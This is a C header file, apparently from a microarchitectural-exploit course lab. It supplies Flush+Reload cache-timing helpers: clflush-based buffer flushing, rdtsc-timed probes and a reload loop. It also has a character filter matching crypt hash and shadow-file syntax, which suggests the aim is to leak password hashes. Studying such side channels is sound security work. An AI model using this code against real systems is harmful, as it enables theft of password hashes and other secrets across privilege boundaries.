/* exploit_uarch/src/helpers.h */

#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
/* helpers for clflush/mfence/rdtscp */
#include "asm_helpers.h"

#define CACHE_THRESHOLD 150

#define PR_SET_SPECULATION_CTRL 53

#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB)
#define PAGE_SIZE 4096
#define RELOAD_BUFFER_SIZE (2 * PAGE_SIZE * 256)
#define LEAK_BUFFER_SIZE (2 * PAGE_SIZE * 256)
#define PRIVATE_BUF_SIZE (PAGE_SIZE * 128)

/* alloc_buffers: Macro to allocate buffers (results, reloadbuffer, leak, privatebuf) */
#define alloc_buffers() \
    __attribute__((aligned(PAGE_SIZE))) size_t results[256] = {0}; \
    unsigned char *reloadbuffer = (unsigned char *)mmap(NULL, RELOAD_BUFFER_SIZE, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0); \
    unsigned char *leak = mmap(NULL, LEAK_BUFFER_SIZE, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);

/* Probe1 function from lab 2 */
static inline int probe1(void *adrs, int threshold) {
    mfence();
    lfence();
    uint64_t t1 = rdtsc();
    lfence();
    
    (void)*(volatile char *)adrs;
    
    lfence();
    uint64_t t2 = rdtsc();
    
    clflush(adrs);
    
    return (t2 - t1) < threshold;
}

/* Flush all lines of the reloadbuffer */
static inline void flush_reloadbuffer(unsigned char *reloadbuffer) {
    for (size_t i = 0; i < 256; ++i) {
        clflush(reloadbuffer + i * PAGE_SIZE);
    }
}


/* Reload and update results based on timing */
static inline void reload_and_update(unsigned char *reloadbuffer, size_t *results) {
    mfence();
    for (size_t k = 0; k < 256; ++k) {
        size_t i = ((k * 167) + 13) & (0xff);
        void *p = reloadbuffer + (PAGE_SIZE * i);

        if (probe1(p, CACHE_THRESHOLD)) {
            results[i]++;
        }
        clflush(reloadbuffer + i * PAGE_SIZE);
    }
}


/*
 * Check whether the char is a valid character for password and salt.
 *
 * See man crypt:
 * The characters in "salt" and "encrypted" are drawn from the set [a-zA-Z0-9./].
 */
inline __attribute__((always_inline)) int valid_char(unsigned char c) {
    switch(c) {
        case 'a':
        case 'b':
        case 'c':
        case 'd':
        case 'e':
        case 'f':
        case 'g':
        case 'h':
        case 'i':
        case 'j':
        case 'k':
        case 'l':
        case 'm':
        case 'n':
        case 'o':
        case 'p':
        case 'q':
        case 'r':
        case 's':
        case 't':
        case 'u':
        case 'v':
        case 'w':
        case 'x':
        case 'y':
        case 'z':
        case 'A':
        case 'B':
        case 'C':
        case 'D':
        case 'E':
        case 'F':
        case 'G':
        case 'H':
        case 'I':
        case 'J':
        case 'K':
        case 'L':
        case 'M':
        case 'N':
        case 'O':
        case 'P':
        case 'Q':
        case 'R':
        case 'S':
        case 'T':
        case 'U':
        case 'V':
        case 'W':
        case 'X':
        case 'Y':
        case 'Z':
        case '0':
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9':
        case '.':
        case '/':

        // additionally needed
        case ':':
        case '$':
            return 1;
    }

    return 0;
}
